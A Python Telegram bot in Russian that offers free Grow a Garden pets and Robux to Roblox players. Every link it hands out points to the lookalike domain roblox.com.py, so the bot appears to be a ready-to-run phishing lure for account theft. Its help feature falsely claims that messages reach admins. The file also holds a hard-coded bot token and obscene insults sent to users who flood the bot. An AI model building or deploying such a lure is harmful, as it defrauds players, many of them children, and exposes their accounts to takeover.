import os
import time
import random
import threading
from flask import Flask
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

TOKEN = os.getenv("BOT_TOKEN", "8265510445:AAHdE3q8Mdpy9Gf0pTtVXdbgz6opxXh0YKE")
bot = telebot.TeleBot(TOKEN)

PETS = [
    ("🦝 Raccoon", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🪰 Dragonfly", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Fennec Fox", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Kitsune", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦖 T-rex", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🐝 Disco Bee", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🍟 French Fry Ferret", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🐙 Mimic Octopus", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("🦊 Red Fox", "https://roblox.com.py/games/126884695634066/Grow-a-Garden?privateServerLinkCode=35500455072211143886256645536"),
    ("💰 Робуксы", "https://roblox.com.py/games/8737602449/PLS-DONATE?privateServerLinkCode=35500455072211143886256645536")
]

help_mode_users = set()
user_message_times = {}
spam_cooldown = {}

spam_responses = [
    "Ты че, долбоёб? Не спамь!",
    "Блядь, хватит уже флудить, дебил.",
    "Уебок, перестань писать столько хуни!",
    "Сука, прекрати этот спам, мудак!",
    "Идиот, да хватит уже тыкать сюда свои сообщения!",
    "Долбаёб, когда уже остановишься?",
    "Пиздуй с этим спамом, пёс!",
    "Клоун, перестань пихать сообщения!",
    "Отвали, пиздун! Хватит флудить!",
    "Мудак, ты реально не понимаешь, что это спам?"
]

def normalize_text(s):
    return s.strip().lower()

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id in help_mode_users:
        help_mode_users.remove(message.chat.id)
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [KeyboardButton(name) for name, _ in PETS]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "Привет! Я бот, который помогает получить питомцев в Grow a Garden Roblox.\nВыбери пета:", reply_markup=markup)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_mode_users.add(message.chat.id)
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("📨 Отправить"))
    bot.send_message(message.chat.id, "Опиши проблему или вопрос. Когда закончишь — нажми кнопку '📨 Отправить'.", reply_markup=markup)

@bot.message_handler(commands=['razdacha'])
def razdacha(message):
    pet_name, pet_link = random.choice(PETS)
    bot.send_message(message.chat.id, f"Случайная раздача: {pet_name}\nЗайди на VIP-сервер по ссылке:\n{pet_link}", reply_markup=ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: m.text == "📨 Отправить")
def send_help(message):
    if message.chat.id in help_mode_users:
        help_mode_users.remove(message.chat.id)
    bot.send_message(message.chat.id, "Спасибо! Ваше сообщение отправлено, админы скоро свяжутся с вами.", reply_markup=ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    user_id = message.chat.id
    now = time.time()
    window = 60
    threshold = 20
    cooldown_seconds = 30

    if user_id not in user_message_times:
        user_message_times[user_id] = []
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < window]
    user_message_times[user_id].append(now)

    if user_id in spam_cooldown and now < spam_cooldown[user_id]:
        return

    if len(user_message_times[user_id]) > threshold:
        bot.send_message(user_id, random.choice(spam_responses))
        spam_cooldown[user_id] = now + cooldown_seconds
        return

    if user_id in help_mode_users:
        return

    text = normalize_text(message.text or "")

    for pet_name, pet_link in PETS:
        plain_name = normalize_text(pet_name.split(" ", 1)[-1])
        if text == normalize_text(pet_name) or text == plain_name:
            bot.send_message(user_id, f"Чтобы получить {pet_name}, зайди на VIP-сервер бота по ссылке:\n{pet_link}", reply_markup=ReplyKeyboardRemove())
            return

    bot.send_message(user_id, "Я тебя не понимаю. Напиши /start или /help.")

def run_bot():
    try:
        bot.remove_webhook()
    except:
        pass
    while True:
        try:
            bot.polling(none_stop=True, timeout=20)
        except:
            time.sleep(5)

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running"

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
